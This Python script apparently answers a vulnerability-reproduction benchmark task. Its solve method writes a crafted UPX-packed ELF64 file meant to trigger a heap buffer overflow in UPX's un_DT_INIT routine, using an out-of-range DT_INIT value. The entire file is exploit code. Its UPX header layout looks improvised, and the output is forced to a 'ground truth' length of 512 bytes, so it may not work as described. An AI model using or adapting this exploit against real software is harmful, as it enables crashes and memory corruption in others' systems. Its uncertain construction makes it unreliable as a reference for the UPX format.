import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PoC for Heap Buffer Overflow in UPX (PackLinuxElf64::un_DT_INIT)
        # The PoC mimics a UPX-packed ELF64 file with a crafted payload that triggers
        # out-of-bounds access during the un_DT_INIT filter processing.
        
        # 1. Create a malicious payload (the "decompressed" image)
        # This payload is an ELF fragment containing a Dynamic Section with a DT_INIT entry.
        # The value of DT_INIT is crafted to cause an invalid offset calculation.
        
        # ELF64 Header Fragment
        # e_ident: \x7fELF, 64-bit(2), LE(1), Ver(1), ABI(0)
        payload = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        # e_type=3 (ET_DYN), e_machine=62 (AMD64)
        payload += struct.pack('<H', 3) + struct.pack('<H', 62)
        # e_version=1
        payload += struct.pack('<I', 1)
        # e_entry=0
        payload += struct.pack('<Q', 0)
        # e_phoff=64
        payload += struct.pack('<Q', 64)
        # e_shoff=0
        payload += struct.pack('<Q', 0)
        # e_flags=0, e_ehsize=64
        payload += struct.pack('<I', 0) + struct.pack('<H', 64)
        # e_phentsize=56, e_phnum=1
        payload += struct.pack('<H', 56) + struct.pack('<H', 1)
        # e_shentsize=64, e_shnum=0, e_shstrndx=0
        payload += struct.pack('<H', 64) + struct.pack('<H', 0) + struct.pack('<H', 0)
        
        # Program Header (PT_DYNAMIC)
        # p_type=2 (PT_DYNAMIC)
        phdr = struct.pack('<I', 2)
        # p_flags=4 (R)
        phdr += struct.pack('<I', 4)
        # p_offset (points to dynamic section) = 120
        phdr += struct.pack('<Q', 120)
        # p_vaddr
        phdr += struct.pack('<Q', 120)
        # p_paddr
        phdr += struct.pack('<Q', 120)
        # p_filesz, p_memsz (Size of Dynamic Section)
        phdr += struct.pack('<Q', 32) + struct.pack('<Q', 32)
        # p_align
        phdr += struct.pack('<Q', 1)
        
        payload += phdr
        
        # Dynamic Section
        # DT_INIT (12) with a large/malicious value to trigger OOB
        # The vulnerability involves calculating an offset based on this value.
        dyn = struct.pack('<Q', 12) + struct.pack('<Q', 0xFFFFFFFFFFFFFFF0)
        # DT_NULL (0)
        dyn += struct.pack('<Q', 0) + struct.pack('<Q', 0)
        
        payload += dyn
        
        # 2. Construct the UPX wrapper (Stub + Headers)
        # The file mimics a packed binary.
        
        # Stub (can be the payload itself or a dummy ELF)
        # We start with the valid ELF header to pass initial checks
        poc = payload[:64]
        # Padding to 128 bytes for alignment/header placement
        poc += b'\x00' * (128 - len(poc))
        
        # UPX PackHeader (p_info)
        # Magic
        p_info = b'UPX!'
        
        # Compressed/Uncompressed sizes & checksums
        # We claim the data is "Stored" (Method 0) so c_len == u_len
        u_len = len(payload)
        c_len = len(payload)
        adler = zlib.adler32(payload) & 0xffffffff
        
        p_info += struct.pack('<I', u_len)
        p_info += struct.pack('<I', c_len)
        p_info += struct.pack('<I', adler) # u_adler
        p_info += struct.pack('<I', adler) # c_adler
        
        # Version, Format, Method, Level
        # Version 13 (0x0D)
        # Format 37 (0x25) - Linux/Elf64
        # Method 0 (M_NONE) - Stored
        # Level 1
        p_info += b'\x0D\x25\x00\x01'
        
        # Padding p_info to 32 bytes
        p_info = p_info.ljust(32, b'\x00')
        
        poc += p_info
        
        # Block Info (b_info)
        # sz_u, sz_c, adler_u, adler_c
        b_info = struct.pack('<I', u_len)
        b_info += struct.pack('<I', c_len)
        b_info += struct.pack('<I', adler)
        b_info += struct.pack('<I', adler)
        
        poc += b_info
        
        # Append the actual data
        poc += payload
        
        # Ensure total length is 512 bytes (ground truth length)
        # Fill with 0 or repeat data
        if len(poc) < 512:
            poc += b'\x00' * (512 - len(poc))
        else:
            poc = poc[:512]
            
        return poc
